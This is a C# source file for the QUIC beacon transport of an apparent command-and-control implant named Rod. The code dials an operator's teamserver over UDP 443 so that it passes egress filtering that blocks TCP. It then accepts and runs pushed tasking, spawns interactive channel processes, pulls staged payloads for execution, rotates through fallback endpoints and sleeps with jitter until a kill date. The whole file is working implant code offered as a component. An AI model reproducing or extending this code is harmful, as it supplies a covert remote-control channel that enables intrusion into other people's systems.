using System.Collections.Concurrent;
using System.Net;
using System.Net.Quic;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The reference implant's QUIC stream client (architecture.md Sec 8): the
// same live session the gRPC stream and the WebSocket beacon run, over a
// QUIC connection -- the duplex shape for egress that passes UDP/443 but
// blocks TCP. The wire is the stream check-in contract
// (extending/implants.md): one bidirectional stream per connection, one
// self-delimited message per direction turn -- a varint byte length, then
// the envelope's delimited frame sequence. TLS is QUIC's own (the front
// terminates TLS 1.3 and requests no client certificate), the identity is
// the id in the handshake, and tasking verification follows Tier 1 exactly
// like every other client. A whole source-file module like its siblings:
// the build unit drops this file from builds whose walk has no quic://
// entry to dial.

/// <summary>
/// Builds the QUIC stream client off the shared setup; the factory the
/// generated transport selection names for quic:// beacon entries.
/// </summary>
internal static class QuicCheckIn
{
    public static ICheckInClient Create(CheckInSetup setup) => new QuicBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Config.ClassVerbs,
        setup.Log,
        setup.Nonces,
        setup.Cadence,
        setup.Held,
        // The QUIC enroll exchange's live connection (architecture.md Sec 8,
        // enrollment over QUIC): the first cycle rides it -- the ordinary
        // handshake follows the enroll on the same stream, one connection
        // carrying enroll-then-session -- and every later cycle dials fresh.
        setup.EnrollConnection as QuicWire);
}

/// <summary>
/// Runs the implant's check-in lifecycle over a QUIC stream: dial the
/// connection, open the stream, handshake (the first message), then hold the
/// session -- read tasking and channel input, write results and channel
/// output -- until the connection drops, the kill date passes, or the server
/// refuses permanently. A dropped connection is a reconnect, not a
/// termination: the session survives it server-side, so the next cycle
/// re-handshakes and continues.
/// </summary>
internal sealed class QuicBeacon : ICheckInClient
{
    /// <summary>
    /// The ALPN the listener matches. Textual lockstep with the teamserver's
    /// QUIC listener, the same discipline the beacon URL shapes follow.
    /// </summary>
    public const string Alpn = "rod1";

    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly X509Certificate2Collection _pinned;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;
    private readonly Cadence? _cadence;
    private readonly FrontedPivots? _fronted;
    private readonly TaskNonceTracker _nonces;
    private readonly HeldTaskLedger _held;
    private QuicWire? _firstWire;

    // The shared task-acceptance pipeline (fronting gate, verification,
    // dedup, staged/channel/inline shapes) over this client's per-run state.
    private readonly BeaconTasking _tasking;

    public QuicBeacon(
        EgressEndpoints egress,
        string implantId,
        IReadOnlyList<X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        IReadOnlyList<string> classVerbs,
        TextWriter log,
        TaskNonceTracker? nonces = null,
        Cadence? cadence = null,
        HeldTaskLedger? held = null,
        QuicWire? firstWire = null)
    {
        _egress = egress;
        _implantId = implantId;
        _cas = cas;
        _pinned = new X509Certificate2Collection();
        foreach (var ca in cas)
            _pinned.Add(ca);
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _firstWire = firstWire;
        _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
    }

    /// <summary>
    /// This client carries the quic:// dial shape (architecture.md Sec 8):
    /// a quic-schemed beacon URL names the QUIC stream; a schemed http(s)
    /// URL belongs to the web clients, a bare host:port to the gRPC stream.
    /// </summary>
    public bool Serves(string beaconUrl) => BeaconUrl.IsQuic(beaconUrl);

    /// <summary>
    /// Blocks until cancellation, the kill date passing, or a permanent
    /// handshake refusal. A dropped connection walks the egress entry and
    /// reconnects on the jittered cadence with the same exponential backoff
    /// the other clients apply. Returns
    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
    /// entry is not a quic:// URL, so the coordinator hands the run to the
    /// client that carries it.
    /// </summary>
    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            if (!BeaconUrl.IsQuic(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;

            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
                // The connection died mid-flight: results written on it may
                // never have been read, so the next connection re-sends them
                // (first-wins server-side).
                _held.InvalidateDeliveries();
            }

            // Every non-OK handshake status is permanent for this artifact:
            // retrying would not change the answer.
            if (cycle == BeaconCycleResult.Terminal)
                return CheckInExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake walks to the next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // One connection: dial (or take the enroll exchange's handoff wire, the
    // one connection that carries enroll-then-session), handshake, then hold
    // the session until the server closes, the connection drops, or
    // cancellation fires. Throws on transport errors (the caller logs and
    // reconnects); a refused handshake returns Terminal.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        await using var wire = TakeFirstWire()
            ?? await QuicWire.ConnectAsync(_egress.CurrentBeaconUrl, _pinned, cancellationToken)
                .ConfigureAwait(false);

        // The implant speaks first: the handshake frame -- re-opens (or
        // reuses) the session and re-advertises the baked class verbs
        // intersected with the compiled handlers (architecture.md Sec 5.3),
        // both negotiation arms offered.
        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
        await wire.WriteFramesAsync(
            new[] { new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) } },
            CancellationToken.None);

        // The server answers the same shape: the handshake response frame is
        // the first message's first frame.
        var firstInbound = await wire.ReadFramesAsync(cancellationToken);
        if (firstInbound.Count == 0)
            throw new InvalidOperationException("the stream closed before the handshake response");
        var response = HandshakeResponse.Parser.ParseFrom(firstInbound[0].Payload);
        if (response.Status != HandshakeStatus.Ok)
        {
            _log.WriteLine($"handshake refused: {response.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = response.ReplayNonces;
        // The receive-ack arm is per connection (architecture.md Sec 10.3).
        var acks = response.TaskAcks;
        _log.WriteLine($"handshake ok: engagement={response.EngagementId}, replay-nonces={response.ReplayNonces}");

        // Tasking loop: the gRPC stream's own shape over the message
        // adapters. A write gate serializes this loop and every live
        // channel's pumps; the live channels, keyed by task id, take the
        // ChannelInput frames the loop routes to them. Both die with the
        // connection: the finally cancels every channel and waits out its
        // pumps.
        var writeGate = new SemaphoreSlim(1, 1);
        var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        async Task Write(Frame frame, CancellationToken ct) => await WriteFrameAsync(wire, writeGate, frame, ct);

        // Results whose delivery died with an earlier connection ride this
        // one first (architecture.md Sec 10.3 -- the dispatch strand); the
        // server records first-wins, so a duplicate is absorbed.
        await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);

        try
        {
            var inbound = firstInbound;
            var index = 1;
            while (true)
            {
                for (; index < inbound.Count; index++)
                {
                    var frame = inbound[index];

                    // ChannelInput is the only kind-bearing downstream frame:
                    // operator input for a live channel, routed by task id.
                    if (frame.Kind == FrameKind.ChannelInput)
                    {
                        BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                        continue;
                    }

                    var task = TaskRequest.Parser.ParseFrom(frame.Payload);

                    // The dispatch strand's ack half (architecture.md Sec
                    // 10.3): delivery evidence for the parsed frame, before
                    // anything runs. The dedup half lives inside the shared
                    // acceptance, after verification.
                    if (acks)
                        await Write(BeaconFrames.AckFrame(task.TaskId), cancellationToken);
                    await _tasking.AcceptAsync(
                        task,
                        isPoll: false,
                        Write,
                        (staged, ct) => RunStagedTaskAsync(wire, writeGate, staged, ct),
                        (started, handler) => StartChannel(wire, writeGate, liveChannels, started, handler, channelsGone.Token),
                        cancellationToken);
                }

                // A message carrying only the handshake response is a live
                // keep-alive: park here until the next message -- pushed
                // tasking, channel input, or the close that ends the session.
                inbound = await wire.ReadFramesAsync(cancellationToken);
                index = 0;
            }
        }
        finally
        {
            // The connection is ending: the channels are session-scoped, so
            // they end with it. The token releases the handlers (their
            // processes are killed and their pumps unwind), and the delivery
            // waits keep the stream alive until every pump's last write has
            // left the gate.
            channelsGone.Cancel();
            foreach (var live in liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
        }
    }

    // Claims the enroll exchange's handoff wire exactly once: the first
    // cycle after a QUIC enroll rides it, every reconnect dials fresh.
    private QuicWire? TakeFirstWire() => Interlocked.Exchange(ref _firstWire, null);

    // Opens a channel for a dispatched streaming task and starts its handler
    // in the background: the loop returns to reading immediately, the channel
    // takes its input frames as they arrive, and the delivery task reports
    // the handler's outcome as the task's final TaskResult.
    private void StartChannel(
        QuicWire wire,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) => new ValueTask(WriteFrameAsync(wire, writeGate, frame, ct)));
        liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
        channel.Delivery = DeliverChannelAsync(wire, writeGate, channel, task, handler, lifetime);
    }

    // The channel's delivery: run the handler to its end, then write its
    // outcome. A channel whose stream dies under it ends silently -- there is
    // no operator left to tell, and the server-side task stays dispatched,
    // the documented session-scoped lifetime.
    private async Task DeliverChannelAsync(
        QuicWire wire,
        SemaphoreSlim writeGate,
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
            await WriteFrameAsync(wire, writeGate, BeaconFrames.ResultFrame(task, outcome, output), CancellationToken.None);
            _held.Remember(task.TaskId, outcome, output);
            _held.MarkDelivered(task.TaskId);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            channel.CompleteInput();
        }
    }

    // How long a staged read waits for the next chunk before giving up on
    // the transfer: a timeout, not a cadence -- a server that cannot produce
    // the next chunk within it has failed the transfer.
    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);

    // Runs one staged task (architecture.md Sec 10, the typed arm): demand
    // the payload, reassemble the chunk run the server answers with, then
    // dispatch the verb's staged handler. Over the stream the demand's answer
    // rides the pushed messages, so the read parks on this transfer's
    // deadline rather than the session's blocking read.
    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
        QuicWire wire,
        SemaphoreSlim writeGate,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(wire, writeGate, new Frame
        {
            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
            Kind = FrameKind.StagedPull,
        }, cancellationToken);

        var parts = new List<byte[]>();
        var total = 0;
        while (true)
        {
            using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            deadline.CancelAfter(StagedChunkTimeout);
            IReadOnlyList<Frame> inbound;
            try
            {
                inbound = await wire.ReadFramesAsync(deadline.Token);
            }
            catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
            {
                _log.WriteLine($"task {task.TaskId}: staged transfer timed out");
                return (TaskOutcome.Failed, "staged payload stream timed out before the terminal chunk");
            }

            StagedChunk chunk = null!;
            var found = false;
            foreach (var frame in inbound)
            {
                try
                {
                    var candidate = StagedChunk.Parser.ParseFrom(frame.Payload);
                    if (candidate.TaskId == task.TaskId)
                    {
                        chunk = candidate;
                        found = true;
                        break;
                    }
                }
                catch (InvalidProtocolBufferException)
                {
                    // Not a chunk frame; the next message may carry the run.
                }
            }
            if (!found)
                continue;

            var data = chunk.Data.ToArray();
            parts.Add(data);
            total += data.Length;
            if (chunk.Terminal)
                break;
        }

        var payload = new byte[total];
        var offset = 0;
        foreach (var part in parts)
        {
            part.CopyTo(payload, offset);
            offset += part.Length;
        }
        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
    }

    // One frame at a time through the gate: the dispatch loop and every live
    // channel's output pumps share the stream, so all of them write through
    // it.
    private async Task WriteFrameAsync(
        QuicWire wire,
        SemaphoreSlim writeGate,
        Frame frame,
        CancellationToken cancellationToken)
    {
        await writeGate.WaitAsync(cancellationToken);
        try
        {
            await wire.WriteFramesAsync(new[] { frame }, cancellationToken);
        }
        finally
        {
            writeGate.Release();
        }
    }
}

// The QUIC dial and the self-delimited message framing over one
// bidirectional stream: the stream check-in contract's wire shape
// (extending/implants.md), the transport half this client adapts. Plain
// .NET stream types cross its boundary, so the QUIC surface (and its
// platform gate) stays inside.
internal sealed class QuicWire : IAsyncDisposable
{
    // The message budget: the envelope's wire-body cap, the same ceiling the
    // poll bridges enforce on a check-in message.
    private const int MaxMessageBytes = 16 * 1024 * 1024;

    // The pinned-CA validation and keep-alive interval ride every dial.
    private readonly QuicConnection _connection;
    private readonly QuicStream _stream;

    // Whether the host OS carries a QUIC stack (msquic on Linux): the union
    // guard the platform analyzer follows; a dial before checking it throws
    // the named cause instead of a platform exception mid-lifecycle.
    [System.Runtime.Versioning.SupportedOSPlatformGuard("windows")]
    [System.Runtime.Versioning.SupportedOSPlatformGuard("linux")]
    [System.Runtime.Versioning.SupportedOSPlatformGuard("osx")]
    private static bool QuicAvailable => QuicConnection.IsSupported;

    private QuicWire(QuicConnection connection, QuicStream stream)
    {
        _connection = connection;
        _stream = stream;
    }

    /// <summary>
    /// Dials the quic:// beacon URL: one connection carrying the pinned-CA
    /// validation (the same anchor the enroll client pins), one outbound
    /// bidirectional stream for the session, keep-alives so a parked session
    /// outlives the server's idle window.
    /// </summary>
    public static async Task<QuicWire> ConnectAsync(
        string beaconUrl,
        X509Certificate2Collection pinned,
        CancellationToken cancellationToken)
    {
        if (!QuicAvailable)
            throw new InvalidOperationException(
                "the host provides no QUIC stack; the quic beacon cannot dial "
                + "(install libmsquic on Linux, or run on an OS that ships one)");

        var uri = new Uri(beaconUrl);
        IPAddress[] addresses;
        if (IPAddress.TryParse(uri.Host, out var parsed))
            addresses = new[] { parsed };
        else
            addresses = await Dns.GetHostAddressesAsync(uri.Host, cancellationToken);
        var address = addresses.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)
            ?? addresses[0];

        var connection = await QuicConnection.ConnectAsync(
            new QuicClientConnectionOptions
            {
                RemoteEndPoint = new IPEndPoint(address, uri.Port),
                DefaultStreamErrorCode = 0,
                DefaultCloseErrorCode = 0,
                ClientAuthenticationOptions = new SslClientAuthenticationOptions
                {
                    ApplicationProtocols = new List<SslApplicationProtocol> { new(QuicBeacon.Alpn) },
                    RemoteCertificateValidationCallback = (_, certificate, chain, _) =>
                        C2.PinServerChain(certificate as X509Certificate2, chain, pinned),
                },
                // A parked session sends nothing for as long as no tasking is
                // queued; the keep-alive holds the connection through the
                // listener's idle window.
                KeepAliveInterval = TimeSpan.FromSeconds(30),
            },
            cancellationToken).ConfigureAwait(false);
        try
        {
            var stream = await connection.OpenOutboundStreamAsync(
                QuicStreamType.Bidirectional, cancellationToken).ConfigureAwait(false);
            return new QuicWire(connection, stream);
        }
        catch
        {
            await connection.DisposeAsync();
            throw;
        }
    }

    /// <summary>Writes one message: the frames, varint-length-prefixed.</summary>
    public async Task WriteFramesAsync(IReadOnlyList<Frame> frames, CancellationToken cancellationToken)
    {
        if (!QuicAvailable)
            throw new InvalidOperationException("the host provides no QUIC stack.");

        var body = EnvelopeCodec.Encode(frames);
        var prefix = new byte[5];
        var value = (ulong)body.Length;
        var index = 0;
        while (value >= 0x80)
        {
            prefix[index++] = (byte)(value | 0x80);
            value >>= 7;
        }
        prefix[index++] = (byte)value;

        await _stream.WriteAsync(prefix.AsMemory(0, index), cancellationToken).ConfigureAwait(false);
        if (body.Length > 0)
            await _stream.WriteAsync(body, cancellationToken).ConfigureAwait(false);
        await _stream.FlushAsync(cancellationToken).ConfigureAwait(false);
    }

    /// <summary>
    /// Reads one message and parses its frames. A clean close reads as an
    /// empty list; a malformed or oversized body throws, dropping the
    /// connection.
    /// </summary>
    public async Task<IReadOnlyList<Frame>> ReadFramesAsync(CancellationToken cancellationToken)
    {
        if (!QuicAvailable)
            throw new InvalidOperationException("the host provides no QUIC stack.");

        long length = 0;
        var shift = 0;
        while (true)
        {
            var one = new byte[1];
            if (await _stream.ReadAsync(one.AsMemory(), cancellationToken).ConfigureAwait(false) <= 0)
                return Array.Empty<Frame>();
            length |= (long)(one[0] & 0x7f) << shift;
            if ((one[0] & 0x80) == 0)
                break;
            shift += 7;
            if (shift > 28)
                throw new InvalidOperationException("check-in length prefix is a malformed varint");
        }
        if (length > MaxMessageBytes)
            throw new InvalidOperationException("check-in message exceeds the body budget");

        var body = new byte[length];
        var offset = 0;
        while (offset < length)
        {
            var read = await _stream.ReadAsync(body.AsMemory(offset), cancellationToken).ConfigureAwait(false);
            if (read <= 0)
                throw new InvalidOperationException("the stream closed mid-message");
            offset += read;
        }
        return EnvelopeCodec.Parse(body);
    }

    public async ValueTask DisposeAsync()
    {
        if (!QuicAvailable)
            return;

        await _stream.DisposeAsync().ConfigureAwait(false);
        await _connection.DisposeAsync().ConfigureAwait(false);
    }
}
